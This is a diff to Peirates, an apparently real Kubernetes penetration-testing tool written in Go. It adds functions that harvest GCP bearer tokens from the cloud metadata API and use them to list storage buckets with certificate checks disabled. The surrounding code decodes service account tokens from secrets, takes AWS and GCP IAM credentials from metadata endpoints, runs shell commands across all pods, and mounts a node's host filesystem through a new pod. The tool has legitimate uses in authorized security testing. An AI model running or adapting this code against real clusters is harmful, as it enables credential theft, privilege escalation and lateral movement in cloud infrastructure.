@@ -13,15 +13,16 @@ package peirates
 import (
 	"bytes"
 	"context"
-	"encoding/json"
+	"crypto/tls"
 	"encoding/base64"
+	"encoding/json"
 	"flag" // Command line flag parsing
 	"fmt"  // String formatting (Printf, Sprintf)
 	"io"
 	"io/ioutil" // Utils for dealing with IO streams
 	"log"       // Logging utils
 	"math/rand" // Random module for creating random string building
-	"os" // Environment variables ...
+	"os"        // Environment variables ...
 
 	// HTTP client/server
 	"net/http"
@@ -39,7 +40,7 @@ func getPodList(connectionString ServerInfo) []string {
 
 	var pods []string
 
-	getPodsRaw, _, err := runKubectlSimple(connectionString,"get", "pods")
+	getPodsRaw, _, err := runKubectlSimple(connectionString, "get", "pods")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -66,12 +67,12 @@ func getPodList(connectionString ServerInfo) []string {
 }
 
 // Get the names of the available Secrets from the current namespace and a list of service account tokens
-func getSecretList(connectionString ServerInfo) ([]string,[]string) {
+func getSecretList(connectionString ServerInfo) ([]string, []string) {
 
 	var secrets []string
 	var service_account_tokens []string
 
-	getSecretsRaw, _, err := runKubectlSimple(connectionString,"get", "secrets")
+	getSecretsRaw, _, err := runKubectlSimple(connectionString, "get", "secrets")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -88,7 +89,7 @@ func getSecretList(connectionString ServerInfo) ([]string,[]string) {
 			fields := strings.Fields(line)
 			secret := fields[0]
 			// Check for header row
-			if (secret != "NAME") {
+			if secret != "NAME" {
 				secrets = append(secrets, secret)
 				if fields[1] == "kubernetes.io/service-account-token" {
 					service_account_tokens = append(service_account_tokens, secret)
@@ -97,7 +98,33 @@ func getSecretList(connectionString ServerInfo) ([]string,[]string) {
 		}
 	}
 
-	return secrets,service_account_tokens
+	return secrets, service_account_tokens
+}
+
+// GetGCPBearerTokenFromMetadataAPI takes the name of a GCP service account and returns a token
+func GetGCPBearerTokenFromMetadataAPI(account string) string {
+	client := &http.Client{}
+	// TURN THIS INTO A FUNCTION SO WE CAN PARSE the ones we want
+	url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
+	req_token, err := http.NewRequest("GET", url, nil)
+	req_token.Header.Add("Metadata-Flavor", "Google")
+	response, err := client.Do(req_token)
+	if err != nil {
+		println("Error - could not perform request ", url)
+	}
+	defer response.Body.Close()
+	body, err := ioutil.ReadAll(response.Body)
+	// Body will look like this, unless error has occurred: {"access_token":"xxxxxxx","expires_in":2511,"token_type":"Bearer"}
+	// TODO: Add a check for a 200 status code
+	// Split the body on "" 's for now
+	// TODO: Parse this as JSON
+	token_elements := strings.Split(string(body), "\"")
+	if token_elements[1] == "access_token" {
+		return (token_elements[3])
+	} else {
+		println("Error - could not find token in returned body text: ", string(body))
+		return "ERROR"
+	}
 }
 
 //
@@ -105,7 +132,7 @@ func getSecretList(connectionString ServerInfo) ([]string,[]string) {
 // In the medium term, this function will disappear
 //
 func getHostname(connectionString ServerInfo, PodName string) string {
-	
+
 	hostname, _, err := runKubectlSimple(connectionString, "exec", "-it", PodName, "hostname")
 	if err != nil {
 		fmt.Println("- Checking for hostname of pod "+PodName+" failed: ", err)
@@ -121,12 +148,11 @@ func SwitchNamespace(connectionString *ServerInfo) bool {
 
 	println("\nEnter namespace to switch to or hit enter to maintain current namespace: ")
 	fmt.Scanln(&input)
-	if (input != "") {
+	if input != "" {
 		connectionString.Namespace = input
 	}
 	return true
 }
-					
 
 // runKubectl executes the kubectl library internally, allowing us to use the
 // Kubernetes API and requiring no external binaries.
@@ -230,7 +256,7 @@ func canCreatePods(connectionString ServerInfo) bool {
 func inAPod(connectionString ServerInfo) bool {
 
 	if os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
-		println("[+] You may be in a Kubernetes pod. API Server to be found at: ",os.Getenv("KUBERNETES_SERVICE_HOST"))
+		println("[+] You may be in a Kubernetes pod. API Server to be found at: ", os.Getenv("KUBERNETES_SERVICE_HOST"))
 		return true
 	} else {
 		println("[-] You may not be in a Kubernetes pod. Press ENTER to continue.")
@@ -247,7 +273,7 @@ func PrintNamespaces(connectionString ServerInfo) []string {
 
 	// TODO: Add checking to make sure you're authorized to get namespaces
 
-	NamespacesRaw, _, err := runKubectlSimple(connectionString,"get", "namespaces")
+	NamespacesRaw, _, err := runKubectlSimple(connectionString, "get", "namespaces")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -286,9 +312,9 @@ func getListOfPods(connectionString ServerInfo) {
 // execInAllPods() runs kubeData.command in all running pods
 func execInAllPods(connectionString ServerInfo, command string) {
 	runningPods := getPodList(connectionString)
-	
+
 	for _, execPod := range runningPods {
-		execInPodOut, _, err := runKubectlSimple(connectionString,"exec", "-it", execPod, "--", "/bin/sh", "-c", command)
+		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/sh", "-c", command)
 		if err != nil {
 			fmt.Println("[-] Executing "+command+" in Pod "+execPod+" failed: ", err)
 		} else {
@@ -303,8 +329,8 @@ func execInAllPods(connectionString ServerInfo, command string) {
 func execInListPods(connectionString ServerInfo, pods []string, command string) {
 	fmt.Println("+ Running supplied command in list of pods")
 	for _, execPod := range pods {
-		
-		execInPodOut, _, err := runKubectlSimple(connectionString,"exec", "-it", execPod, "--", "/bin/sh", "-c", command)
+
+		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/sh", "-c", command)
 		if err != nil {
 			fmt.Println("[-] Executing "+command+" in Pod "+execPod+" failed: ", err)
 		} else {
@@ -479,12 +505,11 @@ type PodDetails struct {
 }
 
 type Secret_Details struct {
-	
-	Data      []struct {
+	Data []struct {
 		Namespace string `json:"namespace"`
-		Token       string `json:"token"`
+		Token     string `json:"token"`
 	}
-	Metadata   struct {
+	Metadata struct {
 		Name string `json:"name"`
 	}
 	SecretType string `json:"type"`
@@ -493,7 +518,7 @@ type Secret_Details struct {
 // GetPodsInfo() gets details for all pods in json output and stores in PodDetails struct
 func GetPodsInfo(connectionString ServerInfo, podDetails *PodDetails) {
 	fmt.Println("+ Getting details for all pods")
-	podDetailOut, _, err := runKubectlSimple(connectionString,"get", "pods", "-o", "json")
+	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
 	println(string(podDetailOut))
 	if err != nil {
 		fmt.Println("[-] Unable to retrieve details from this pod: ", err)
@@ -537,7 +562,7 @@ func GetHostMountPointsForPod(podInfo PodDetails, pod string) {
 // It parses all roles into a KubeRoles object.
 func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
 	fmt.Println("+ Getting all Roles")
-	rolesOut, _, err := runKubectlSimple(connectionString,"get", "role", "-o", "json")
+	rolesOut, _, err := runKubectlSimple(connectionString, "get", "role", "-o", "json")
 	if err != nil {
 		fmt.Println("[-] Unable to retrieve roles from this pod: ", err)
 	} else {
@@ -552,7 +577,7 @@ func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
 
 func MountRootFS(allPodsListme []string, connectionString ServerInfo) {
 	var MountInfoVars = MountInfo{}
-	
+
 	// BUG: this routine seems to create the same pod name every time, which makes it so it can't run twice.
 
 	// First, confirm we're allowed to create pods
@@ -569,39 +594,38 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo) {
 	hostname := os.Getenv("HOSTNAME")
 	approach1_success := false
 	var image string
-	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod",hostname)
+	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
 	if err != nil {
 		approach1_success = false
 		println("DEBUG: describe pod didn't work")
 	} else {
 		podDescriptionLines := strings.Split(string(podDescriptionRaw), "\n")
 		for _, line := range podDescriptionLines {
-			start := strings.Index(line,"Image:")
+			start := strings.Index(line, "Image:")
 			if start != -1 {
 				// Found an Image line -- now get the image
-				image = strings.TrimSpace(line[start + 6:])
-				println ("Found image :",image)
+				image = strings.TrimSpace(line[start+6:])
+				println("Found image :", image)
 				approach1_success = true
 
 				MountInfoVars.image = image
 			}
 		}
-		if ! approach1_success {
+		if !approach1_success {
 			println("DEBUG: did not find an image line in your pod's definition.")
 		}
 	}
-	
-	if (approach1_success) {
+
+	if approach1_success {
 		println("Got image definition from own pod.")
 	} else {
 		// Approach 2 - use the most recently staged running pod
 		//
 		// TODO: re-order the list and stop the for loop as soon as we have the first running or as soon as we're able to make one of these work.
 
-
 		// Future version of approach 2:
-		// 	Let's make something to mount the root filesystem, but not pick a deployment.  Rather, 
-		// it should populate a list of all pods in the current namespace, then iterate through 
+		// 	Let's make something to mount the root filesystem, but not pick a deployment.  Rather,
+		// it should populate a list of all pods in the current namespace, then iterate through
 		// images trying to find one that has a shell.
 
 		// Here's the useful part of that data.
@@ -622,7 +646,7 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo) {
 			//log.Fatal(err)
 			println("ERROR: Could not get pods")
 			return
-		}	
+		}
 		getImageLines := strings.Split(string(getImagesRaw), "\n")
 		for _, line := range getImageLines {
 			matched, err := regexp.MatchString(`^\s*$`, line)
@@ -639,8 +663,7 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo) {
 			}
 		}
 	}
-	
-	
+
 	//creat random string
 	rand.Seed(time.Now().UnixNano())
 	randomString := randSeq(6)
@@ -747,17 +770,17 @@ ________________________________________
    https://www.inguardians.com/labs/
 
 ----------------------------------------------------------------`)
-	
-	if (connectionString.Token != "") {
-	
-		fmt.Printf("[+] Service Account Loaded: %s\n",connectionString.TokenName)
+
+	if connectionString.Token != "" {
+
+		fmt.Printf("[+] Service Account Loaded: %s\n", connectionString.TokenName)
 	}
 	var have_ca bool = false
-	if (connectionString.CAPath != "") {
+	if connectionString.CAPath != "" {
 		have_ca = true
 	}
-  fmt.Printf("[+] Certificate Authority Certificate: %t\n",have_ca)
-  fmt.Printf("[+] Kubernetes API Server: %s:%s\n",connectionString.RIPAddress,connectionString.RPort)
+	fmt.Printf("[+] Certificate Authority Certificate: %t\n", have_ca)
+	fmt.Printf("[+] Kubernetes API Server: %s:%s\n", connectionString.RIPAddress, connectionString.RPort)
 	fmt.Println("[+] Current hostname:", name)
 	fmt.Println("[+] Current namespace:", connectionString.Namespace)
 
@@ -773,11 +796,11 @@ func PeiratesMain() {
 	cmdOpts := CommandLineOptions{connectionConfig: &connectionString}
 	var kubeRoles KubeRoles
 	var podInfo PodDetails
-	
+
 	// Store all acquired namespaces for this cluster in a global variable, populated and refreshed by PrintNamespaces()
 	var Namespaces []string
 	println(Namespaces)
-	
+
 	//kubeData.arg =""
 	//kubeData.list = {}
 
@@ -785,10 +808,10 @@ func PeiratesMain() {
 	parseOptions(&cmdOpts)
 
 	// Check environment variables - see KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT
-	// Watch the documentation on these variables for changes: 
+	// Watch the documentation on these variables for changes:
 	// https://kubernetes.io/docs/concepts/containers/container-environment-variables/
 
-  // BUG: confirm that this does the right thing when not in a pod.
+	// BUG: confirm that this does the right thing when not in a pod.
 	if inAPod(connectionString) {
 		println("+ You are in a pod.")
 	} else {
@@ -818,16 +841,14 @@ Vulnerabilities and Misconfiguration Searching |
 [10] Check all pods for volume mounts
 [11] Launch a pod mounting its node's host filesystem
 [12] Request list of pods from a Kubelet [not yet implemented]
-
 ------------------------------------------------+
 Cloud-specific Credential Gathering             |
 ------------------------------------------------+
-
 [13] Request IAM credentials from AWS Metadata API [AWS only]
 [14] Request IAM credentials from GCP Metadata API [GCP only]
-[15] Request kube-env from AWS Metadata API [AWS only] [not yet implemented]
-[16] Request kube-env from GCP Metadata API [GCP only]
-
+[15] Request kube-env from GCP Metadata API [GCP only]
+[16] Pull Kubernetes service account tokens from S3 [AWS only] [not yet implemented]
+[17] Pull Kubernetes service account tokens from GCS [GCP only] [not yet implemented]
 ------+
 Pivot |
 ------+
@@ -835,7 +856,6 @@ Pivot |
 [21] Switch to an acquired service account [not yet implemented]
 [30] Run command in one or all pods in this namespace 
 [33] Run a command in a pod via a Kubelet [not yet implemented]
-
 -----+
 Misc |
 -----+
@@ -854,14 +874,14 @@ Peirates:># `)
 		// exit
 		case "exit":
 			os.Exit(0)
-		
+
 		// [1] Enter a different service account token
 		case "1":
 
 			println("\nPlease paste in a new service account token or hit ENTER to maintain current token.")
 			var token string
 			fmt.Scanln(&token)
-			if (token != "") {
+			if token != "" {
 				connectionString.Token = token
 			}
 		// [2] List namespaces or change namespace
@@ -869,18 +889,18 @@ Peirates:># `)
 			println("\n[1] List namespaces]\n[2] Switch namespace\n[3] List namespaces then switch namespaces")
 			fmt.Scanln(&input)
 			switch input {
-				case "1":
-					Namespaces = PrintNamespaces(connectionString)
-					break
-				case "2":
-					SwitchNamespace(&connectionString)
-					break
-				case "3":
-					Namespaces = PrintNamespaces(connectionString)
-					SwitchNamespace(&connectionString)
-					break
-				default:
-					break
+			case "1":
+				Namespaces = PrintNamespaces(connectionString)
+				break
+			case "2":
+				SwitchNamespace(&connectionString)
+				break
+			case "3":
+				Namespaces = PrintNamespaces(connectionString)
+				SwitchNamespace(&connectionString)
+				break
+			default:
+				break
 			}
 
 		// [3] Get list of pods
@@ -893,18 +913,18 @@ Peirates:># `)
 		case "4":
 			GetPodsInfo(connectionString, &podInfo)
 			break
-		
+
 		//	[5] Get list of secrets
 		case "5":
-			secrets,service_account_tokens := getSecretList(connectionString) 
+			secrets, service_account_tokens := getSecretList(connectionString)
 			for _, secret := range secrets {
-				println("Secret found: ",secret)
+				println("Secret found: ", secret)
 			}
 			for _, svc_acct := range service_account_tokens {
-				println("Service account found: ",svc_acct)
+				println("Service account found: ", svc_acct)
 			}
 			break
-		
+
 		// [6] Get a service account token from a secret
 		case "6":
 			println("\nPlease enter the name of the secret for which you'd like the contents: ")
@@ -912,12 +932,12 @@ Peirates:># `)
 			fmt.Scanln(&secret_name)
 
 			// BUG: Temporarily we're using we're kludgy YAML parsing.
-			getSecretYAML, _, err := runKubectlSimple(connectionString,"get", "secret",secret_name,"-o","yaml")
+			getSecretYAML, _, err := runKubectlSimple(connectionString, "get", "secret", secret_name, "-o", "yaml")
 			if err != nil {
 				fmt.Println("[-] Could not retrieve secret")
 				break
 				// log.Fatal(err)
-			} 
+			}
 
 			lines := strings.Split(string(getSecretYAML), "\n")
 			for _, line := range lines {
@@ -930,12 +950,12 @@ Peirates:># `)
 					if strings.Fields(line)[0] == "token:" {
 						token := strings.Fields(line)[1]
 						// println("Encoded: ",token)
-						decoded_token,err := base64.StdEncoding.DecodeString(token)
+						decoded_token, err := base64.StdEncoding.DecodeString(token)
 						if err != nil {
 							println("ERROR: couldn't decode")
 							break
 						} else {
-							fmt.Printf("Decoded:\n%q\n",decoded_token)
+							fmt.Printf("Decoded:\n%q\n", decoded_token)
 						}
 					}
 				}
@@ -945,33 +965,29 @@ Peirates:># `)
 
 			break
 
-			getSecretRaw, _, err := runKubectlSimple(connectionString,"get", "secret",secret_name,"-o","json")
+			getSecretRaw, _, err := runKubectlSimple(connectionString, "get", "secret", secret_name, "-o", "json")
 			// TODO-FAITH - determine which errors mean we should just show an error and break
 			if err != nil {
 				fmt.Println("[-] Could not retrieve secret")
 				break
 				// log.Fatal(err)
 			} else {
-					var secretDetails Secret_Details
-					err := json.Unmarshal(getSecretRaw, &secretDetails)
-					if err != nil {
-						fmt.Println("[-] Error unmarshaling data in this secret: ", err)
-						break
-					}
-					println("Secret has type: ",secretDetails.SecretType)
-					if (secretDetails.SecretType == "kubernetes.io/service-account-token") {
-						//println("Token found: ",secretDetails.Data.Token)
-						println("Token found!")
-					} else {
-						fmt.Println("Non-token secret parsing not yet implemented")
-						
-					}
+				var secretDetails Secret_Details
+				err := json.Unmarshal(getSecretRaw, &secretDetails)
+				if err != nil {
+					fmt.Println("[-] Error unmarshaling data in this secret: ", err)
+					break
+				}
+				println("Secret has type: ", secretDetails.SecretType)
+				if secretDetails.SecretType == "kubernetes.io/service-account-token" {
+					//println("Token found: ",secretDetails.Data.Token)
+					println("Token found!")
+				} else {
+					fmt.Println("Non-token secret parsing not yet implemented")
 
-				
+				}
+
 			}
-			
-
-
 
 			break
 		case "10":
@@ -993,11 +1009,11 @@ Peirates:># `)
 				fmt.Printf("[+] Printing volume mount points for %s\n", user_response)
 				GetHostMountPointsForPod(podInfo, user_response)
 			}
-		
-		// [11] Launch a pod mounting its node's host filesystem 
+
+		// [11] Launch a pod mounting its node's host filesystem
 		case "11":
 			podCreation := canCreatePods(connectionString)
-			if ! podCreation {
+			if !podCreation {
 				println(" This token cannot create pods on the cluster")
 				break
 			}
@@ -1015,25 +1031,23 @@ Peirates:># `)
 			body, err := ioutil.ReadAll(resp.Body)
 			account := string(body)
 			println(account)
-			
+
 			request := "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + account
 			resp_2, err := http.Get(request)
 			if err != nil {
-				println("Error - could not perform request ",request)
+				println("Error - could not perform request ", request)
 			}
 			defer resp_2.Body.Close()
 			body_2, err := ioutil.ReadAll(resp_2.Body)
 			println(string(body_2))
 			break
-		
-		
+
 		// [14] Request IAM credentials from GCP Metadata API [GCP only] [not yet implemented]
 		case "14":
 			// Create a new HTTP client that uses the correct headers
-			client := &http.Client{
-			}
+			client := &http.Client{}
 			// Make a request for our service account(s)
-			req_accounts, err := http.NewRequest("GET","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", nil)
+			req_accounts, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", nil)
 			req_accounts.Header.Add("Metadata-Flavor", "Google")
 			resp, err := client.Do(req_accounts)
 			if err != nil {
@@ -1048,29 +1062,20 @@ Peirates:># `)
 				if strings.TrimSpace(string(line)) == "" {
 					continue
 				}
-				account := strings.TrimRight(string(line),"/")
-				fmt.Printf("GCP Credentials for account %s\n",account)
-			
-				url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
-				req_token , err := http.NewRequest("GET",url,nil)
-				req_token.Header.Add("Metadata-Flavor", "Google")
-				resp_2, err := client.Do(req_token)
-				if err != nil {
-					println("Error - could not perform request ",url)
-				}
-				defer resp_2.Body.Close()
-				body_2, err := ioutil.ReadAll(resp_2.Body)
-				println(string(body_2))
+				account := strings.TrimRight(string(line), "/")
+				fmt.Printf("GCP Credentials for account %s\n", account)
+
+				// TURN THIS INTO A FUNCTION SO WE CAN PARSE the ones we want
+				println("Token for ", account, " is ", GetGCPBearerTokenFromMetadataAPI(account))
 			}
 			break
-		
-		// [16] Request kube-env from GCP Metadata API [GCP only]
-		case "16":
+
+		// [15] Request kube-env from GCP Metadata API [GCP only]
+		case "15":
 			// Create a new HTTP client that uses the correct headers
-			client := &http.Client{
-			}
+			client := &http.Client{}
 			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
-			req_kube, err := http.NewRequest("GET","http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", nil)
+			req_kube, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", nil)
 			req_kube.Header.Add("Metadata-Flavor", "Google")
 			resp, err := client.Do(req_kube)
 			if err != nil {
@@ -1079,19 +1084,125 @@ Peirates:># `)
 			defer resp.Body.Close()
 			body, err := ioutil.ReadAll(resp.Body)
 			if resp.StatusCode != 200 {
-				fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n",resp.StatusCode)
+				fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
 				break
 			}
 			lines := strings.Split(string(body), "\n")
-			for _,line := range lines {
+			for _, line := range lines {
 				println(line)
 			}
 
 			break
 
+		// [16] Pull Kubernetes service account tokens from S3 [AWS only]
+		case "16":
+			// Create a new HTTP client that uses the correct headers
+			client := &http.Client{}
+
+			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/masters.cluster.bustakube.com
+			//
+			// Calculate the authorization stuff required:
+			// https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-auth-using-authorization-header.html
+			// https://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-header-based-auth.html
+			//
+			// List bucket contents:
+			// https://docs.aws.amazon.com/AmazonS3/latest/API/v2-RESTBucketGET.html
+
+			// Get the object contents:
+			// https://docs.aws.amazon.com/AmazonS3/latest/API/RESTObjectGET.html
+
+			// GET /?list-type=2 HTTP/1.1
+			// Host: BucketName.s3.amazonaws.com
+			// Date: date
+			// Authorization: authorization string (see Authenticating Requests (AWS Signature Version 4))
+
+			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
+			req_kube, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", nil)
+			req_kube.Header.Add("Metadata-Flavor", "Google")
+			resp, err := client.Do(req_kube)
+			if err != nil {
+				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
+			}
+			defer resp.Body.Close()
+			body, err := ioutil.ReadAll(resp.Body)
+			if resp.StatusCode != 200 {
+				fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
+				break
+			}
+			lines := strings.Split(string(body), "\n")
+			for _, line := range lines {
+				println(line)
+			}
+
+			break
+
+		// [17] Pull Kubernetes service account tokens from GCS [GCP only] [not yet implemented]
+		case "17":
+			token := GetGCPBearerTokenFromMetadataAPI("default")
+			if token == "ERROR" {
+				println("ERROR: Could not get GCP default token from metadata API")
+				break
+			} else {
+				println("Got default token for GCP - preparing to use it for GCS: ", token)
+			}
+			// Need to get project ID from metadata API
+			client := &http.Client{}
+			req_projid, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", nil)
+			req_projid.Header.Add("Metadata-Flavor", "Google")
+			resp_projid, err := client.Do(req_projid)
+			if err != nil {
+				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id")
+				resp_projid.Body.Close()
+				break
+			}
+			defer resp_projid.Body.Close()
+			body, err := ioutil.ReadAll(resp_projid.Body)
+			// Parse result as one or more accounts, then construct a request asking for each account's credentials
+			project_id := string(body)
+			println("Got numberic project ID", project_id)
+
+			// Prepare to do non-cert-checking https requests
+			tr := &http.Transport{
+				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			}
+			ssl_client := &http.Client{Transport: tr}
+
+			// Get a list of buckets
+			// curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid)
+			url_list_buckets := "https://www.googleapis.com/storage/v1/b/?project=" + project_id
+			req_list_buckets, err := http.NewRequest("GET", url_list_buckets, nil)
+			req_list_buckets.Header.Add("Metadata-Flavor", "Google")
+			bearer_token := "Bearer " + token
+			req_list_buckets.Header.Add("Authorization", bearer_token)
+			req_list_buckets.Header.Add("Accept", "json")
+			resp_list_buckets, err := ssl_client.Do(req_list_buckets)
+			if err != nil {
+				log.Fatal(err)
+				fmt.Printf("Error - could not perform request --%s--\n", url_list_buckets)
+				resp_list_buckets.Body.Close()
+				break
+			}
+			defer resp_projid.Body.Close()
+			body_list_buckets, err := ioutil.ReadAll(resp_list_buckets.Body)
+			bucket_list_lines := strings.Split(string(body_list_buckets), "\n")
+			for _, line := range bucket_list_lines {
+				println(line)
+			}
+
+			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
+
+			// Run through the object list, finding those with /secret in them.  While URL-encoding each object, appending ?alt=media to get the contents.
+
+			// Each of these objects is a service account token - display
+
+			//
+			// Don't forget to base64 decode with base64.StdEncoding.DecodeString()
+
+			break
 		case "19":
 			break
-		// [30] Run command in one or all pods in this namespace 
+		// [30] Run command in one or all pods in this namespace
 		case "30":
 			banner(connectionString)
 			println("\n[1] Run command on a specific pod\n[2] Run command on all pods")
@@ -1104,8 +1215,8 @@ Peirates:># `)
 				fmt.Scanln(&cmdOpts.podsToRunTheCommandIn)
 				var pod_to_run_in string
 				fmt.Scanln(&pod_to_run_in)
-				cmdOpts.podsToRunTheCommandIn = []string{ pod_to_run_in }
-				
+				cmdOpts.podsToRunTheCommandIn = []string{pod_to_run_in}
+
 				if cmdOpts.commandToRunInPods != "" {
 					if len(cmdOpts.podsToRunTheCommandIn) > 0 {
 						execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
@@ -1119,13 +1230,13 @@ Peirates:># `)
 					fmt.Print("ERROR - command string was empty.")
 					fmt.Scanln(&input)
 				}
-				
+
 			}
 		case "98":
 			break
 		case "99":
 			break
-		
+
 		}
 		clear_screen()
 	}
